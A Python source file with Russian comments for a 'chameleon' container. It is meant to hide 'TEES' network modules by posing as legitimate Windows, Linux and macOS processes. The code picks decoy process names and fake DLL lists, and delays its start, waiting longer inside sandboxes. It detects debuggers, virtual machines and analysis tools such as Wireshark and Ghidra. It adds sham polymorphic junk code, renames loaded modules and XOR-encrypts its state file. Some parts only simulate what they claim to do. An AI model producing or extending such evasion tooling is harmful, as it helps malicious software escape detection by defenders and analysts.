# tees_chameleon.py (ПОЛНАЯ ИСПРАВЛЕННАЯ ВЕРСИЯ)
# 🦎 TEES-ХАМЕЛЕОН: Контейнер-обёртка для маскировки
# Маскируется под легитимные процессы Windows/Linux

import os
import sys
import time
import json
import random
import hashlib
import platform
import signal
import logging
import subprocess
import importlib
import threading
from typing import Dict, List, Optional, Any

class ChameleonMetrics:
    """📊 Метрики контейнера для мониторинга."""
    
    def __init__(self):
        self.start_time = time.time()
        self.transform_count = 0
        self.network_operations = 0
        self.modules_loaded = 0
        self.errors = []
        self.activation_time = None
        self.last_transform_time = None
        self.last_network_time = None
    
    def record_transform(self):
        """Запись полиморфного преобразования."""
        self.transform_count += 1
        self.last_transform_time = time.time()
    
    def record_network_op(self):
        """Запись сетевой операции."""
        self.network_operations += 1
        self.last_network_time = time.time()
    
    def record_activation(self):
        """Запись времени активации."""
        self.activation_time = time.time()
    
    def record_error(self, error):
        """Запись ошибки."""
        self.errors.append({
            'timestamp': time.time(),
            'error': str(error)
        })
    
    def get_report(self) -> Dict[str, Any]:
        """Получение отчета о работе."""
        return {
            'uptime': time.time() - self.start_time,
            'transforms': self.transform_count,
            'network_ops': self.network_operations,
            'modules': self.modules_loaded,
            'errors': len(self.errors),
            'activation_time': self.activation_time,
            'last_transform': self.last_transform_time,
            'last_network': self.last_network_time
        }

class ChameleonContainer:
    """
    🦎 Контейнер-хамелеон.
    Маскирует TEES-сеть под безобидные процессы.
    """
    
    def __init__(self):
        self.os_type = platform.system()
        self.process_name = self._get_innocent_name()
        self.pid = os.getpid()
        self.activation_delay = random.uniform(30, 120)  # Отложенный старт
        self.fake_modules = self._generate_fake_modules()
        self.real_modules = {}
        self.metrics = ChameleonMetrics()
        self.lifecycle = ChameleonLifecycle(self)
        self.state_file = self.lifecycle.state_file
        self.logger = None
        
        # Настройка логирования
        self._setup_logging()
        
        # Настройка обработчиков сигналов
        self._setup_signal_handlers()
    
    def _setup_logging(self):
        """Настройка логирования."""
        self.logger = logging.getLogger(f'chameleon_{self.pid}')
        self.logger.setLevel(logging.INFO)
        
        # Закрываем старые обработчики
        for handler in self.logger.handlers[:]:
            handler.close()
            self.logger.removeHandler(handler)
        
        # Файловый обработчик
        log_file = os.path.join(
            '/tmp' if self.os_type != 'Windows' else 'C:\\Temp',
            f'.tees_log_{self.pid}.log'
        )
        
        try:
            os.makedirs(os.path.dirname(log_file), exist_ok=True)
            handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
            handler.setFormatter(logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            ))
            self.logger.addHandler(handler)
        except:
            handler = logging.StreamHandler(sys.stderr)
            handler.setFormatter(logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            ))
            self.logger.addHandler(handler)
    
    def _setup_signal_handlers(self):
        """Настройка обработчиков сигналов."""
        def signal_handler(signum, frame):
            if self.logger:
                self.logger.info(f"Получен сигнал {signum}, завершаем работу...")
            self.lifecycle.stop()
            sys.exit(0)
        
        try:
            signal.signal(signal.SIGTERM, signal_handler)
            signal.signal(signal.SIGINT, signal_handler)
        except:
            pass
    
    def __del__(self):
        """Деструктор для закрытия файлов."""
        if self.logger:
            for handler in self.logger.handlers[:]:
                handler.close()
                self.logger.removeHandler(handler)
    
    def _get_valid_names(self) -> List[str]:
        """Получение списка валидных имён процессов."""
        innocent_names = {
            'Windows': [
                'svchost.exe', 'explorer.exe', 'dllhost.exe',
                'RuntimeBroker.exe', 'ShellExperienceHost.exe',
                'SearchIndexer.exe', 'spoolsv.exe',
                'ctfmon.exe', 'taskhostw.exe', 'sihost.exe'
            ],
            'Linux': [
                'systemd-journald', 'NetworkManager', 'cron',
                'dbus-daemon', 'sshd', 'polkitd',
                'accounts-daemon', 'wpa_supplicant',
                'systemd-logind', 'systemd-resolved'
            ],
            'Darwin': [
                'cfprefsd', 'mdworker', 'notifyd',
                'distnoted', 'coreservicesd', 'WindowServer',
                'launchd', 'syslogd', 'mds'
            ]
        }
        return innocent_names.get(self.os_type, ['init'])
    
    def _get_innocent_name(self) -> str:
        """Генерирует безобидное имя процесса."""
        return random.choice(self._get_valid_names())
    
    def _generate_fake_modules(self) -> List[str]:
        """Генерирует фейковые модули для маскировки."""
        fake_libs = []
        
        if self.os_type == 'Windows':
            fake_libs = [
                'kernel32.dll', 'user32.dll', 'advapi32.dll',
                'ole32.dll', 'shell32.dll', 'ws2_32.dll',
                'crypt32.dll', 'sechost.dll', 'gdi32.dll',
                'comdlg32.dll', 'msvcrt.dll', 'ntdll.dll',
                'winhttp.dll', 'wtsapi32.dll', 'iphlpapi.dll'
            ]
        elif self.os_type == 'Linux':
            fake_libs = [
                'libc.so.6', 'libpthread.so.0', 'libdl.so.2',
                'libm.so.6', 'librt.so.1', 'libutil.so.1',
                'libresolv.so.2', 'libnss_files.so.2',
                'libnss_dns.so.2', 'libnsl.so.1', 'libz.so.1'
            ]
        else:
            fake_libs = [
                'libSystem.B.dylib', 'libc++.1.dylib',
                'libobjc.A.dylib', 'libdispatch.dylib',
                'libnetwork.dylib', 'libsqlite3.dylib'
            ]
        
        # Добавляем случайные хеши для полиморфизма
        return [f"{lib}::{hashlib.md5(os.urandom(16)).hexdigest()[:8]}" for lib in fake_libs]
    
    def verify_integrity(self) -> bool:
        """Проверка целостности контейнера."""
        checks = {
            'process_name': self.process_name in self._get_valid_names(),
            'fake_modules': len(self.fake_modules) > 5,
            'activation_delay': self.activation_delay > 0,
            'logger': self.logger is not None,
            'metrics': self.metrics is not None,
            'lifecycle': self.lifecycle is not None
        }
        
        if self.logger:
            self.logger.info(f"Проверка целостности: {checks}")
        return all(checks.values())
    
    def camouflage_network(self) -> Dict[str, Any]:
        """Маскирует сетевую активность."""
        # Имитация обычного сетевого трафика
        common_ports = [80, 443, 53, 8080, 3128, 8443, 993, 995]
        common_hosts = [
            'windowsupdate.microsoft.com',
            'www.google.com',
            'cdn.jsdelivr.net',
            'api.github.com',
            'pypi.org',
            'update.microsoft.com',
            'ocsp.digicert.com',
            'crl.microsoft.com'
        ]
        
        # Добавляем случайный шум
        if random.random() < 0.3:  # 30% шанс добавить нестандартный порт
            common_ports.append(random.randint(1024, 65535))
        
        network_data = {
            'ports': random.sample(common_ports, min(3, len(common_ports))),
            'hosts': random.sample(common_hosts, min(3, len(common_hosts))),
            'protocol': random.choice(['TCP', 'UDP', 'HTTP/2', 'QUIC']),
            'dns_queries': random.randint(5, 20),
            'connection_time': random.uniform(0.1, 2.0)
        }
        
        self.metrics.record_network_op()
        if self.logger:
            self.logger.debug(f"Сетевая маскировка: {network_data}")
        
        return network_data
    
    def delay_activation(self):
        """Отложенная активация — не привлекает внимание сразу."""
        # В песочнице ждём дольше
        if self._is_sandbox():
            self.activation_delay *= 3
            if self.logger:
                self.logger.info(f"Обнаружена песочница, задержка увеличена до {self.activation_delay:.0f} секунд")
        
        if self.logger:
            self.logger.info(f"Ожидание {self.activation_delay:.0f} секунд...")
        print(f"🦎 Хамелеон: ожидание {self.activation_delay:.0f} секунд...")
        
        try:
            # Имитируем нормальную активность во время ожидания
            intervals = int(self.activation_delay / 10)
            for i in range(intervals):
                time.sleep(10)
                self._fake_innocent_behavior()
                if self.logger:
                    self.logger.debug(f"Интервал ожидания {i+1}/{intervals}")
        except KeyboardInterrupt:
            if self.logger:
                self.logger.info("Активация прервана пользователем")
            print("\n⚠️ Активация прервана пользователем")
            sys.exit(0)
        
        self.metrics.record_activation()
        if self.logger:
            self.logger.info("Активация завершена")
    
    def polymorphic_transform(self) -> Dict[str, Any]:
        """Полиморфное преобразование — меняет структуру."""
        # Меняем порядок загрузки модулей
        module_order = list(self.real_modules.keys())
        random.shuffle(module_order)
        
        # Добавляем случайные "мусорные" инструкции
        junk_code = [
            f"x_{i} = {random.randint(0, 100)}" 
            for i in range(random.randint(3, 10))
        ]
        
        # Генерируем новую сигнатуру
        new_signature = hashlib.sha256(
            f"{self.process_name}{time.time()}{os.urandom(32)}".encode()
        ).hexdigest()[:16]
        
        transform_data = {
            'module_order': module_order,
            'junk_code': junk_code,
            'checksum': new_signature,
            'timestamp': time.time()
        }
        
        self.metrics.record_transform()
        if self.logger:
            self.logger.debug(f"Полиморфное преобразование: {new_signature}")
        
        return transform_data
    
    def load_tees_modules(self) -> int:
        """Загружает TEES-модули под видом безобидных библиотек."""
        tees_modules = {
            'tees_core': 'system_core',
            'chaos_identity': 'identity_manager',
            'tees_external_socket': 'network_service',
            'tees_external_network_v2': 'mesh_protocol'
        }
        
        loaded = 0
        for real_name, fake_name in tees_modules.items():
            try:
                # Загружаем модуль
                module = importlib.import_module(real_name)
                self.real_modules[fake_name] = module
                
                # Маскируем под безобидное имя
                module.__name__ = fake_name
                module.__package__ = 'system'
                
                loaded += 1
                if self.logger:
                    self.logger.info(f"Модуль {real_name} загружен как {fake_name}")
            except ImportError as e:
                if self.logger:
                    self.logger.warning(f"Модуль {real_name} не найден: {e}")
                continue
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Ошибка загрузки модуля {real_name}: {e}")
                self.metrics.record_error(e)
                continue
        
        self.metrics.modules_loaded = loaded
        return loaded
    
    def anti_analysis(self) -> List[str]:
        """Защита от анализа."""
        protections = []
        
        # Проверка на песочницу
        if self._is_sandbox():
            protections.append('sandbox_detected')
            self.activation_delay = random.uniform(300, 600)  # Долго ждём в песочнице
            if self.logger:
                self.logger.warning("Обнаружена песочница")
        
        # Проверка на дебаггер
        if self._is_debugger():
            protections.append('debugger_detected')
            self._fake_innocent_behavior()
            if self.logger:
                self.logger.warning("Обнаружен дебаггер")
        
        # Проверка на мониторинг
        if self._is_monitored():
            protections.append('monitoring_detected')
            self.camouflage_network()
            if self.logger:
                self.logger.warning("Обнаружен мониторинг")
        
        # Проверка на виртуализацию
        if self._is_virtualized():
            protections.append('vm_detected')
            if self.logger:
                self.logger.warning("Обнаружена виртуализация")
        
        return protections
    
    def _is_sandbox(self) -> bool:
        """Определяет, запущены ли мы в песочнице."""
        sandbox_indicators = [
            'SANDBOX' in os.environ,
            'VBOX' in os.environ,
            'VMWARE' in os.environ,
            'CUCKOO' in os.environ,
            self._check_ram() < 2048,  # Мало RAM — подозрительно
            self._check_cpu_cores() < 2,  # Мало ядер — песочница
            self._check_disk_size() < 50  # Мало места на диске
        ]
        return any(sandbox_indicators)
    
    def _is_debugger(self) -> bool:
        """Определяет, подключён ли дебаггер."""
        if self.os_type == 'Linux':
            try:
                with open('/proc/self/status', 'r') as f:
                    status = f.read()
                    tracer_pid = status.split('TracerPid:')[1].split('\n')[0].strip()
                    return tracer_pid != '0'
            except:
                return False
        elif self.os_type == 'Windows':
            try:
                import ctypes
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            except:
                return False
        return False
    
    def _is_monitored(self) -> bool:
        """Проверяет, мониторится ли система."""
        # Проверка на наличие инструментов мониторинга
        monitoring_tools = [
            'wireshark', 'tcpdump', 'process monitor',
            'process explorer', 'fiddler', 'charles',
            'burp suite', 'ida pro', 'ghidra'
        ]
        
        # Проверяем запущенные процессы
        try:
            if self.os_type == 'Linux':
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                return any(tool in result.stdout.lower() for tool in monitoring_tools)
            elif self.os_type == 'Windows':
                result = subprocess.run(['tasklist'], capture_output=True, text=True)
                return any(tool in result.stdout.lower() for tool in monitoring_tools)
        except:
            pass
        
        return False
    
    def _is_virtualized(self) -> bool:
        """Определяет, запущены ли мы в виртуальной машине."""
        if self.os_type == 'Linux':
            try:
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read().lower()
                    vm_indicators = ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen']
                    return any(indicator in cpuinfo for indicator in vm_indicators)
            except:
                return False
        elif self.os_type == 'Windows':
            try:
                import ctypes
                # Проверка через WMI
                result = subprocess.run(
                    ['wmic', 'computersystem', 'get', 'model'],
                    capture_output=True, text=True
                )
                vm_indicators = ['vmware', 'virtualbox', 'virtual machine', 'qemu']
                return any(indicator in result.stdout.lower() for indicator in vm_indicators)
            except:
                return False
        return False
    
    def _check_ram(self) -> int:
        """Проверяет количество RAM (MB)."""
        if self.os_type == 'Linux':
            try:
                with open('/proc/meminfo', 'r') as f:
                    first_line = f.readline()
                    return int(first_line.split()[1]) // 1024
            except:
                return 8192
        elif self.os_type == 'Windows':
            try:
                import ctypes
                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ('dwLength', ctypes.c_ulong),
                        ('dwMemoryLoad', ctypes.c_ulong),
                        ('ullTotalPhys', ctypes.c_ulonglong),
                        ('ullAvailPhys', ctypes.c_ulonglong),
                        ('ullTotalPageFile', ctypes.c_ulonglong),
                        ('ullAvailPageFile', ctypes.c_ulonglong),
                        ('ullTotalVirtual', ctypes.c_ulonglong),
                        ('ullAvailVirtual', ctypes.c_ulonglong),
                        ('ullAvailExtendedVirtual', ctypes.c_ulonglong),
                    ]
                memory_status = MEMORYSTATUSEX()
                memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
                return int(memory_status.ullTotalPhys / (1024 * 1024))
            except:
                return 8192
        return 8192
    
    def _check_cpu_cores(self) -> int:
        """Проверяет количество ядер CPU."""
        return os.cpu_count() or 8
    
    def _check_disk_size(self) -> int:
        """Проверяет размер диска (GB)."""
        if self.os_type == 'Linux':
            try:
                result = subprocess.run(['df', '-h', '/'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                if len(lines) > 1:
                    size_str = lines[1].split()[1]
                    return int(size_str.replace('G', ''))
            except:
                return 100
        elif self.os_type == 'Windows':
            try:
                result = subprocess.run(
                    ['wmic', 'logicaldisk', 'get', 'size'],
                    capture_output=True, text=True
                )
                sizes = [int(x) for x in result.stdout.split() if x.isdigit()]
                if sizes:
                    return max(sizes) // (1024 * 1024 * 1024)
            except:
                return 100
        return 100
    
    def _fake_innocent_behavior(self):
        """Имитирует безобидное поведение."""
        innocent_actions = [
            self._simulate_file_operations,
            self._simulate_memory_usage,
            self._simulate_cpu_usage,
            self._simulate_network_activity
        ]
        random.choice(innocent_actions)()
    
    def _simulate_file_operations(self):
        """Имитация файловых операций."""
        temp_files = ['config.ini', 'cache.dat', 'settings.json', 'log.txt', 'temp.tmp']
        for fname in temp_files:
            path = os.path.join('/tmp' if self.os_type != 'Windows' else 'C:\\Temp', fname)
            try:
                with open(path, 'w') as f:
                    f.write(random.choice(['normal data', 'config', 'cache', '']))
                time.sleep(0.1)
                os.remove(path)
            except:
                pass
    
    def _simulate_memory_usage(self):
        """Имитация нормального использования памяти."""
        sizes = [1024, 2048, 4096, 8192, 10240]
        fake_data = bytearray(random.choice(sizes))
        time.sleep(0.1)
        del fake_data
    
    def _simulate_cpu_usage(self):
        """Имитация нормальной CPU нагрузки."""
        for _ in range(random.randint(100, 1000)):
            _ = hashlib.md5(os.urandom(16)).hexdigest()
    
    def _simulate_network_activity(self):
        """Имитация нормальной сетевой активности."""
        # Просто генерируем случайные данные
        _ = hashlib.sha256(os.urandom(64)).hexdigest()
    
    def run(self):
        """Запускает контейнер-хамелеон."""
        try:
            if self.logger:
                self.logger.info("🚀 Запуск TEES-ХАМЕЛЕОН")
            print(f"🦎 TEES-ХАМЕЛЕОН АКТИВИРОВАН")
            print(f"   Процесс: {self.process_name}")
            print(f"   PID: {self.pid}")
            print(f"   OS: {self.os_type}")
            print(f"   Модули-маски: {len(self.fake_modules)}")
            
            # Проверка целостности
            if not self.verify_integrity():
                if self.logger:
                    self.logger.error("❌ Ошибка целостности контейнера")
                return
            
            # Анти-анализ
            protections = self.anti_analysis()
            print(f"   Защита: {', '.join(protections) if protections else 'активна'}")
            
            # Отложенная активация
            self.delay_activation()
            
            # Загрузка TEES-модулей
            modules_loaded = self.load_tees_modules()
            print(f"   TEES-модули загружены: {modules_loaded}")
            
            # Полиморфное преобразование
            transform = self.polymorphic_transform()
            print(f"   Полиморфизм: {len(transform['junk_code'])} мусорных инструкций")
            
            # Маскировка сети
            network = self.camouflage_network()
            print(f"   Сетевые порты: {network['ports']}")
            print(f"   Хосты: {network['hosts'][:2]}...")
            
            print(f"\n✅ Контейнер-хамелеон готов к работе!")
            print(f"   TEES-сеть скрыта и защищена! 🛡️")
            
            if self.logger:
                self.logger.info("✅ Контейнер успешно активирован")
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"❌ Ошибка при запуске: {e}")
            self.metrics.record_error(e)
            print(f"❌ Ошибка: {e}")


class ChameleonLifecycle:
    """🔄 Управление жизненным циклом контейнера."""
    
    def __init__(self, container):
        self.container = container
        self.state = 'initialized'
        self.start_time = time.time()
        self.uptime = 0
        self.thread = None
        self.state_file = os.path.join(
            '/tmp' if container.os_type != 'Windows' else 'C:\\Temp',
            f'.tees_state_{container.pid}.json'
        )
    
    def start(self):
        """Запуск контейнера в отдельном потоке."""
        if self.state == 'initialized':
            self.state = 'running'
            self.thread = threading.Thread(
                target=self.container.run,
                daemon=True
            )
            self.thread.start()
            if self.container.logger:
                self.container.logger.info("Контейнер запущен в фоновом режиме")
    
    def pause(self):
        """Приостановка контейнера."""
        if self.state == 'running':
            self.state = 'paused'
            self._save_state()
            if self.container.logger:
                self.container.logger.info("Контейнер приостановлен")
    
    def resume(self):
        """Возобновление работы."""
        if self.state == 'paused':
            self.state = 'running'
            self._restore_state()
            if self.container.logger:
                self.container.logger.info("Контейнер возобновлен")
    
    def stop(self):
        """Остановка контейнера."""
        if self.state in ['running', 'paused']:
            self.state = 'stopped'
            self._cleanup()
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=1)
            if self.container.logger:
                self.container.logger.info("Контейнер остановлен")
    
    def _save_state(self):
        """Сохранение состояния контейнера."""
        # Сохраняем текущий uptime
        self.uptime = time.time() - self.start_time
        
        state_data = {
            'state': self.state,
            'uptime': self.uptime,
            'modules': list(self.container.real_modules.keys()),
            'process': self.container.process_name,
            'timestamp': time.time(),
            'metrics': self.container.metrics.get_report()
        }
        try:
            os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
            with open(self.state_file, 'w') as f:
                json.dump(state_data, f)
            # Шифруем файл состояния
            self._encrypt_state_file()
            if self.container.logger:
                self.container.logger.debug("Состояние сохранено")
        except Exception as e:
            if self.container.logger:
                self.container.logger.error(f"Ошибка сохранения состояния: {e}")
    
    def _restore_state(self):
        """Восстановление состояния контейнера."""
        try:
            # Расшифровываем файл состояния
            self._decrypt_state_file()
            with open(self.state_file, 'r') as f:
                state_data = json.load(f)
            
            self.state = state_data.get('state', 'running')
            self.uptime = state_data.get('uptime', 0)
            if self.container.logger:
                self.container.logger.debug("Состояние восстановлено")
        except:
            self.state = 'running'
            if self.container.logger:
                self.container.logger.warning("Не удалось восстановить состояние")
    
    def _encrypt_state_file(self):
        """Шифрует файл состояния."""
        try:
            with open(self.state_file, 'rb') as f:
                data = f.read()
            
            # Простое XOR-шифрование
            key = hashlib.sha256(str(self.container.pid).encode()).digest()
            encrypted = bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])
            
            with open(self.state_file, 'wb') as f:
                f.write(encrypted)
        except:
            pass
    
    def _decrypt_state_file(self):
        """Расшифровывает файл состояния."""
        try:
            with open(self.state_file, 'rb') as f:
                data = f.read()
            
            # Дешифрование XOR
            key = hashlib.sha256(str(self.container.pid).encode()).digest()
            decrypted = bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])
            
            with open(self.state_file, 'wb') as f:
                f.write(decrypted)
        except:
            pass
    
    def _cleanup(self):
        """Очистка после остановки."""
        try:
            if os.path.exists(self.state_file):
                os.remove(self.state_file)
                if self.container.logger:
                    self.container.logger.debug("Файл состояния удален")
        except:
            pass
    
    def get_status(self) -> Dict[str, Any]:
        """Получение статуса."""
        return {
            'state': self.state,
            'uptime': time.time() - self.start_time,
            'modules': len(self.container.real_modules),
            'process': self.container.process_name,
            'metrics': self.container.metrics.get_report(),
            'thread_alive': self.thread.is_alive() if self.thread else False
        }


if __name__ == "__main__":
    chameleon = ChameleonContainer()
    
    # Демонстрация жизненного цикла
    print("🦎 Демонстрация жизненного цикла хамелеона:")
    print("=" * 50)
    
    # Запускаем в фоне
    chameleon.lifecycle.start()
    time.sleep(2)  # Даем время на запуск
    
    # Показываем статус
    status = chameleon.lifecycle.get_status()
    print(f"\n📊 Статус: {json.dumps(status, indent=2)}")
    
    # Пауза
    chameleon.lifecycle.pause()
    status = chameleon.lifecycle.get_status()
    print(f"\n📊 После паузы: {status['state']}")
    
    # Возобновление
    chameleon.lifecycle.resume()
    status = chameleon.lifecycle.get_status()
    print(f"\n📊 После возобновления: {status['state']}")
    
    # Остановка
    chameleon.lifecycle.stop()
    status = chameleon.lifecycle.get_status()
    print(f"\n📊 После остановки: {status['state']}")
    
    # Показываем метрики
    print(f"\n📈 Метрики:")
    print(json.dumps(status['metrics'], indent=2))